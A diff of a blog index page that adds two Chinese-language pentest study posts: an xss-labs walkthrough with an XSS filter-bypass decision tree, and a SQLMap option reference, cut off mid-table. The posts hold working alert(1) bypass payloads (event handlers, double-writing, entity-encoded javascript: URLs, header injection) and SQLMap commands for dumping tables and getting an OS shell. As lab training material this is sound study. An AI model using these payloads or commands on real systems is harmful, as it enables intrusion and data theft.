@@ -176,18 +176,18 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-count">16</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-count">13</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">52</span>
+        <span class="site-state-item-count">74</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -212,6 +212,1173 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://byroins.github.io/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/private/icon1.png">
+      <meta itemprop="name" content="Byron">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Byron">
+      <meta itemprop="description" content="Documenting vulnerability reproduction, SRC bug bounty write-ups, and custom penetration testing tools.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Byron">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/" class="post-title-link" itemprop="url">XSS-Bypass-Decision-Tree</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-07-20 22:00:00" itemprop="dateCreated datePublished" datetime="2026-07-20T22:00:00+08:00">2026-07-20</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-08-12 16:53:37" itemprop="dateModified" datetime="2026-08-12T16:53:37+08:00">2026-08-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web-security/" itemprop="url" rel="index"><span itemprop="name">web-security</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web-security/xss/" itemprop="url" rel="index"><span itemprop="name">xss</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <blockquote>
+<p>Environment: PHP 7.3.4 + MySQL 5.7.26</p>
+</blockquote>
+<blockquote>
+<p>Lab: xss-labs</p>
+</blockquote>
+<hr>
+<h2 id="1-0-概述"><a href="#1-0-概述" class="headerlink" title="1.0 概述"></a>1.0 概述</h2><h3 id="1-1-XSS-跨站脚本攻击-Cross-Site-Scripting"><a href="#1-1-XSS-跨站脚本攻击-Cross-Site-Scripting" class="headerlink" title="1.1 XSS 跨站脚本攻击 (Cross-Site Scripting)"></a>1.1 XSS 跨站脚本攻击 (Cross-Site Scripting)</h3><ul>
+<li><p>攻击者往网页注入<strong>恶意 JavaScript 代码</strong>, 其他用户访问页面时脚本自动执行, 窃取用户信息, 劫持会话, 篡改页面, 诱导跳转钓鱼.</p>
+</li>
+<li><p>核心成因: <strong>前端未过滤用户输入, 直接渲染到页面.</strong></p>
+</li>
+</ul>
+<h3 id="1-2-三大分类"><a href="#1-2-三大分类" class="headerlink" title="1.2 三大分类"></a>1.2 三大分类</h3><ul>
+<li><p><strong>01 存储型xss(持久型, 危害最大)</strong></p>
+<ul>
+<li><p>恶意代码存入服务器数据库, 所有访问该页面的用户都会触发</p>
+</li>
+<li><p>场景：评论区, 留言板, 帖子, 个人简介</p>
+</li>
+<li><p>示例留言：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>存入数据库后, 任何人打开页面都会弹出 Cookie</p>
+</blockquote>
+</li>
+</ul>
+</li>
+<li><p><strong>02 反射型XSS(非持久型)</strong></p>
+<ul>
+<li><p>恶意代码放在 URL 参数里, 点开特制链接才触发, 不存入后端</p>
+<blockquote>
+<p>后端直接把 keyword 拼到页面展示, 打开链接即执行脚本</p>
+</blockquote>
+</li>
+</ul>
+</li>
+<li><p><strong>03 DOM 型 XSS</strong></p>
+<ul>
+<li><p>漏洞完全发生在<strong>前端 JS</strong>, 数据不经过后端, 后端无日志记录</p>
+</li>
+<li><p>原理: JS 直接从 URL, location.hash 获取数据并插入 DOM</p>
+</li>
+<li><p>示例:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> search = location.<span class="property">search</span>.<span class="title function_">slice</span>(<span class="number">1</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;tip&quot;</span>).<span class="property">innerHTML</span> = search;</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="2-0-XSS实战"><a href="#2-0-XSS实战" class="headerlink" title="2.0 XSS实战"></a>2.0 XSS实战</h2><h3 id="2-1-XSS绕过决策树"><a href="#2-1-XSS绕过决策树" class="headerlink" title="2.1 XSS绕过决策树"></a>2.1 XSS绕过决策树</h3><ul>
+<li><p><strong>01 HTML标签之间</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>你的输入<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>标准Payload</p>
+</blockquote>
+</li>
+<li><p><strong>02 HTML属性值内</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">&quot;你的输入&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=alert(1) &quot;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>思路: 用” 闭合value属性, 用事件触发</p>
+</blockquote>
+</li>
+<li><p><strong>03 JavaScript代码内</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="keyword">var</span> name=<span class="string">&#x27;你的输入&#x27;</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;; alert(1); //</span></span><br><span class="line"><span class="string">&quot;; alert(1); //</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>04 href属性内</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;你的输入&quot;</span>&gt;link&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="2-2-标准验证Payload"><a href="#2-2-标准验证Payload" class="headerlink" title="2.2 标准验证Payload"></a>2.2 标准验证Payload</h3><table>
+<thead>
+<tr>
+<th>攻击向量</th>
+<th>Payload</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&lt;script&gt;</code>标签</td>
+<td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+</tr>
+<tr>
+<td><code>&lt;img&gt;</code>事件</td>
+<td><code>&lt;img src=x onerror=alert(1)&gt;</code></td>
+</tr>
+<tr>
+<td>鼠标点击事件</td>
+<td><code>&quot; onclick=&quot;alert(1)</code></td>
+</tr>
+<tr>
+<td><code>&lt;a&gt;</code>伪协议</td>
+<td><code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;click&lt;/a&gt;</code></td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>该Payload验证, 出现弹窗即存在xss漏洞</p>
+</blockquote>
+<hr>
+<h3 id="2-3-xss-labs通关实战"><a href="#2-3-xss-labs通关实战" class="headerlink" title="2.3 xss-labs通关实战"></a>2.3 xss-labs通关实战</h3><ul>
+<li><p><strong>Level 1</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>该Payload直接通关</p>
+</blockquote>
+<hr>
+</li>
+<li><p><strong>Level 2</strong></p>
+<ul>
+<li><p>测试Payload: <code>&lt;Script&#39;&quot;Oonn&gt;</code>(后续关卡均使用该Payload测试)</p>
+</li>
+<li><p>查看源码</p>
+<p><img data-src="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/2-1.png"></p>
+</li>
+</ul>
+<blockquote>
+<p>可见 <code>&lt;&gt;</code> 未被过滤，但 Payload 仍在 <code>value</code> 属性内，需用 <code>&quot;&gt;</code> 提前闭合</p>
+</blockquote>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+</li>
+<li><p><strong>Level 3</strong></p>
+<p><img data-src="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/3-1.png"></p>
+<blockquote>
+<p>可见在第17行代码中, &lt;&gt; 和 “被编码, 尝试使用鼠标点击事件onclick</p>
+</blockquote>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;onclick=&#x27;</span><span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/3-2.png"></p>
+<blockquote>
+<p>输入框中写入Payload后点击触发事件过关</p>
+</blockquote>
+<hr>
+</li>
+<li><p><strong>Level 4</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;Script&#x27;&quot;</span><span class="attr">Oonn</span>&quot;&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>可见Payload被过滤掉&lt;&gt;, 使用和Level 3相同Payload即可, 只需修改闭合符</p>
+</blockquote>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;onclick=&quot;</span><span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/4-1.png"></p>
+<hr>
+</li>
+<li><p><strong>Level 5</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;&lt;scr_ipt&quot;</span>&#x27;<span class="attr">oo_nn</span>&gt;</span>&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>可见script和on关键字被过滤</p>
+</blockquote>
+<p><strong>使用伪协议:</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;a href=&quot;</span><span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)<span class="string">&quot;&gt;click&lt;/a&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/5-1.png"></p>
+<hr>
+</li>
+<li><p><strong>Level 6</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;&lt;Script&quot;</span>&#x27;<span class="attr">Oo_nn</span>&gt;</span>&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>on事件被过滤, 但大小写script混合未过滤</p>
+</blockquote>
+<p><strong>使用大小写混合:</strong> </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;Script&gt;alert(1)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>成功跳转至Level 7</p>
+</blockquote>
+<hr>
+</li>
+<li><p><strong>Level 7</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;&lt;&quot;</span>&#x27;<span class="attr">on</span>&gt;</span>&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>整个script均被过滤, 但on还剩一个, 证明只做一次过滤</p>
+</blockquote>
+<p><strong>使用双写:</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;scscriptript&gt;alert(1)&lt;/scscriptript&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>逻辑: 源码只过滤一次script关键字, 双写刚好只剩一个完整<code>&lt;script&gt;&lt;/script&gt;</code></p>
+</blockquote>
+<hr>
+</li>
+<li><p><strong>Level 8</strong></p>
+<p><img data-src="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/8-1.png"></p>
+<blockquote>
+<p>源码可见注入发生在<a href>中, 且script会被过滤, 使用编码器将s编码<code>&amp;#x73;</code></a></p>
+</blockquote>
+<p><strong>使用伪协议:</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#x73;<span class="attr">cript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/8-2.png"></p>
+<hr>
+</li>
+<li><p><strong>Level 9</strong></p>
+<p><img data-src="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/9-1.png"></p>
+<blockquote>
+<p>将链接改为标准格式即可</p>
+</blockquote>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#x73;<span class="attr">cript</span>:<span class="title function_">alert</span>(<span class="string">&#x27;http://baidu.com&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/9-2.png"></p>
+<hr>
+</li>
+<li><p><strong>Level 10</strong></p>
+<ul>
+<li><p>主页无输入框, 且keyword的参数不影响value(通过以下源码可知)</p>
+<p><img data-src="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/10-1.png"></p>
+</li>
+</ul>
+<p><img data-src="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/10-2.png"></p>
+<blockquote>
+<p>通过源码可知, 传参点在input内</p>
+</blockquote>
+<ul>
+<li>对t_link, t_history, t_sort 三个字段分别传参测试</li>
+</ul>
+<p><code>t_link=1</code> <code>t_history=1</code> <code>t_sort=1</code></p>
+<p><img data-src="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/10-3.png"></p>
+<blockquote>
+<p>可见注入点在t_sort字段中, 构造以下payload</p>
+</blockquote>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">click<span class="string">&quot; type=&quot;</span>button<span class="string">&quot; onclick=&quot;</span><span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/10-4.png"></p>
+<hr>
+</li>
+<li><p><strong>Level 11</strong></p>
+<p><img data-src="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/11-1.png"></p>
+<blockquote>
+<p>通过以上源码可知, 注入点在t_ref 且或许类似于Request的Referer字段, 利用burpsuite测试</p>
+</blockquote>
+<p><img data-src="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/11-2.png"></p>
+<blockquote>
+<p>抓包数据印证猜测无误, 本页面确实是由level 10 通过构造的t_sort Payload跳转</p>
+</blockquote>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">click<span class="string">&quot; type=&quot;</span>button<span class="string">&quot; onclick=&quot;</span><span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>将Request中Referer字段值替换为以上Payload,  Forward后得到以下结果:</li>
+</ul>
+<p><img data-src="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/11-3.png"></p>
+<hr>
+</li>
+<li><p><strong>Level 12</strong></p>
+<p><img data-src="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/12-1.png"></p>
+<blockquote>
+<p>通过源码可知, t_ua 为Request中User-Agent字段, 同样使用burpsuite抓包</p>
+</blockquote>
+<p><img data-src="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/12-2.png"></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">click<span class="string">&quot; type=&quot;</span>button<span class="string">&quot; onclick=&quot;</span><span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>将Request中User-Agent字段值替换为以上Payload,  Forward后得到以下结果:</li>
+</ul>
+<p><img data-src="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/12-3.png"></p>
+<hr>
+</li>
+<li><p><strong>Level 13</strong></p>
+<p><img data-src="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/13-1.png"></p>
+<blockquote>
+<p>通过源码可知, t_cook 为Request中Cookie字段, 同样使用burpsuite抓包</p>
+</blockquote>
+<p><img data-src="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/13-2.png"></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">click<span class="string">&quot; type=&quot;</span>button<span class="string">&quot; onclick=&quot;</span><span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>将Request中Cookie字段值替换为以上Payload,  Forward后得到以下结果:</li>
+</ul>
+<p><img data-src="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/13-3.png"></p>
+<hr>
+</li>
+</ul>
+<h3 id="2-4-总结"><a href="#2-4-总结" class="headerlink" title="2.4 总结"></a>2.4 总结</h3><table>
+<thead>
+<tr>
+<th>Level</th>
+<th>考察点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1, 2</td>
+<td>无过滤反射型</td>
+</tr>
+<tr>
+<td>3, 4</td>
+<td><code>&lt;&gt;</code>被编码 事件属性绕过</td>
+</tr>
+<tr>
+<td>5</td>
+<td><code>&lt;a&gt;</code>伪协议</td>
+</tr>
+<tr>
+<td>6</td>
+<td>大小写混合</td>
+</tr>
+<tr>
+<td>7</td>
+<td>双写绕过</td>
+</tr>
+<tr>
+<td>8, 9</td>
+<td>伪协议+实体化编码</td>
+</tr>
+<tr>
+<td>10</td>
+<td>隐藏属性+事件属性</td>
+</tr>
+<tr>
+<td>11, 12, 13</td>
+<td>HTTP协议+Request请求头报文+隐藏属性+事件属性</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>Level 1-9 聚焦标签与属性注入绕过, Level 10-13 则将攻击面扩展到HTTP请求头与隐藏参数, 体现了真实攻防中的信息收集能力</p>
+</blockquote>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://byroins.github.io/2026/07/16/web-security/sql-injection/2026-07-16-sqlmap/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/private/icon1.png">
+      <meta itemprop="name" content="Byron">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Byron">
+      <meta itemprop="description" content="Documenting vulnerability reproduction, SRC bug bounty write-ups, and custom penetration testing tools.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Byron">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/07/16/web-security/sql-injection/2026-07-16-sqlmap/" class="post-title-link" itemprop="url">SQLMap</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-07-16 22:00:00 / Modified: 16:02:51" itemprop="dateCreated datePublished" datetime="2026-07-16T22:00:00+08:00">2026-07-16</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web-security/" itemprop="url" rel="index"><span itemprop="name">web-security</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web-security/sql-injection/" itemprop="url" rel="index"><span itemprop="name">sql-injection</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <blockquote>
+<p>Environment: PHP 7.3.4 + MySQL 5.7.26</p>
+</blockquote>
+<blockquote>
+<p>Lab: sqli-labs Less-8</p>
+</blockquote>
+<hr>
+<h2 id="1-0-介绍"><a href="#1-0-介绍" class="headerlink" title="1.0 介绍"></a>1.0 介绍</h2><h3 id="1-1-SQLMap是什么"><a href="#1-1-SQLMap是什么" class="headerlink" title="1.1 SQLMap是什么:"></a>1.1 SQLMap是什么:</h3><p>SQLMap 是一款自动化检测和利用 SQL 注入漏洞的开源工具。它负责你手工做完“确认注入点, 闭合方式, 注入类型”之后的<strong>重复劳动</strong>——自动化拖库, 拿 Shell。</p>
+<h3 id="1-2-参数及作用"><a href="#1-2-参数及作用" class="headerlink" title="1.2 参数及作用"></a>1.2 参数及作用</h3><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>用途</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-u</td>
+<td>指定GET请求的URL</td>
+<td>sqlmap -u “url ?id&#x3D;1”</td>
+</tr>
+<tr>
+<td>-r</td>
+<td>从文件加载HTTP请求(POST, Cookie)</td>
+<td>sqlmap -r request.txt</td>
+</tr>
+<tr>
+<td>-m</td>
+<td>批量扫描多个URL(文件列表)</td>
+<td>sqlmap -m urls.txt</td>
+</tr>
+<tr>
+<td>-p</td>
+<td>指定要测试的参数(多参数时用)</td>
+<td>sqlmap -u “…” -p username</td>
+</tr>
+<tr>
+<td></td>
+<td><strong>注入检测与配置</strong></td>
+<td></td>
+</tr>
+<tr>
+<td>–level</td>
+<td>检测深度1-5,默认1; 2会检测Cookie, 3检测User-Agent&#x2F;Referer</td>
+<td><code>--level 3</code> 会测 HTTP 头注入</td>
+</tr>
+<tr>
+<td>–risk</td>
+<td>风险等级 1-3。<code>2</code> 会测 <code>OR 1=1</code>，<code>3</code> 会测 <code>OR</code> 更新数据</td>
+<td><code>--risk 2</code> 可能修改数据库</td>
+</tr>
+<tr>
+<td>–prefix</td>
+<td>指定 Payload 的前缀（闭合符号）</td>
+<td>–prefix&#x3D;”1’”</td>
+</tr>
+<tr>
+<td>–suffix</td>
+<td>指定 Payload 的后缀（注释符）</td>
+<td>–suffix&#x3D;”–+”</td>
+</tr>
+<tr>
+<td>–technique</td>
+<td>指定注入类型：B（布尔盲注），T（时间盲注），U（UNION），E（报错），S（堆叠）</td>
+<td>手工确认后，用 <code>--technique=B</code> 只跑盲注，加速扫描</td>
+</tr>
+<tr>
+<td></td>
+<td><strong>数据获取</strong></td>
+<td></td>
+</tr>
+<tr>
+<td>–dbs</td>
+<td>列出所有数据库</td>
+<td>sqlmap -u “…” –dbs</td>
+</tr>
+<tr>
+<td>–current-db</td>
+<td>当前库名</td>
+<td>sqlmap -u “…” –current-db</td>
+</tr>
+<tr>
+<td>-D</td>
+<td>指定数据库</td>
+<td>-D security</td>
+</tr>
+<tr>
+<td>–tables</td>
+<td>列出表</td>
+<td>-D security –tables</td>
+</tr>
+<tr>
+<td>-T</td>
+<td>指定表</td>
+<td>-T users</td>
+</tr>
+<tr>
+<td>–columns</td>
+<td>列出列</td>
+<td>-D security -T users –columns</td>
+</tr>
+<tr>
+<td>-C</td>
+<td>指定列（逗号分隔）</td>
+<td>-C username,password</td>
+</tr>
+<tr>
+<td>–dump</td>
+<td>拖出数据</td>
+<td>-D security -T users –dump</td>
+</tr>
+<tr>
+<td>–dump-format</td>
+<td>输出格式</td>
+<td><code>CSV</code>,<code>HTML</code>,<code>SQLITE</code></td>
+</tr>
+<tr>
+<td></td>
+<td><strong>系统交互</strong></td>
+<td><strong>前提条件</strong></td>
+</tr>
+<tr>
+<td>–os-shell</td>
+<td>获取系统 Shell</td>
+<td>MySQL 有写文件权限、知道绝对路径、支持堆叠注入</td>
+</tr>
+<tr>
+<td>–os-cmd</td>
+<td>执行单条系统命令</td>
+<td>同上</td>
+</tr>
+<tr>
+<td>–file-read</td>
+<td>读取目标文件</td>
+<td>有文件读权限</td>
+</tr>
+<tr>
+<td>–file-write</td>
+<td>上传文件到目标</td>
+<td>有文件写权限</td>
+</tr>
+<tr>
+<td>–file-dest</td>
+<td>指定目标文件路径</td>
+<td>有文件写权限</td>
+</tr>
+</tbody></table>
+<h3 id="1-3-输出信息解读"><a href="#1-3-输出信息解读" class="headerlink" title="1.3 输出信息解读"></a>1.3 输出信息解读</h3><table>
+<thead>
+<tr>
+<th>SQLMap 输出信息</th>
+<th>含义</th>
+<th>你的行动</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>[INFO] testing for SQL injection on parameter &#39;id&#39;</code></td>
+<td>正在测试注入点</td>
+<td>等待结果</td>
+</tr>
+<tr>
+<td><code>[INFO] parameter &#39;id&#39; is &#39;MySQL &gt;= 5.0&#39; injectable</code></td>
+<td>确认注入存在，目标为 MySQL</td>
+<td>可以直接用 <code>--dbs</code> 爆库</td>
+</tr>
+<tr>
+<td><code>[CRITICAL] connection timed out</code></td>
+<td>网络超时</td>
+<td>降低 <code>--threads</code> 或加 <code>--delay</code></td>
+</tr>
+<tr>
+<td><code>[WARNING] the SQL query provided does not return any output</code></td>
+<td>注入点无回显，SQLMap 切换盲注</td>
